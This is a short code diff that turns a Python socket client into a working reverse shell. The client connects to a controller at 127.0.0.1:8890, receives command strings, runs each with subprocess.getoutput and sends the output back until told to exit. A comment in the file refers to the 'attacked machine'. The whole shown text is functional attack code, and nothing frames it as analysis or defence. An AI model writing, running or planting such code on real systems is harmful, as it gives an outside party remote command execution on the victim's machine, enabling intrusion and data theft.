@@ -22,26 +22,27 @@ attacked machine
 """
 import socket
 import sys
-
+import subprocess
                
         
 
 def main():
     RADDR = '127.0.0.1'
-    RPORT = 8888
+    RPORT = 8890
     RHOST = (RADDR,RPORT)
     
     try:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect(RHOST)
-        s.send(b'hi im client\n')
+        #s.send(b'hi im client\n')
         while True:            
-            serv_data = s.recv(4096)
-            if not data:
-                continue
-            dec_serv = data.decode('ascii')
-            print(dec_serv)               
-            s.send(b'hi im client\n')
+            cmd = s.recv(1024).decode()
+            if cmd == 'exit':
+                break
+            fb = subprocess.getoutput(cmd)#feedback after cmd                     
+            s.send(fb.encode())
+    except KeyboardInterrupt:
+        s.close()        
     finally:
         s.close()
 
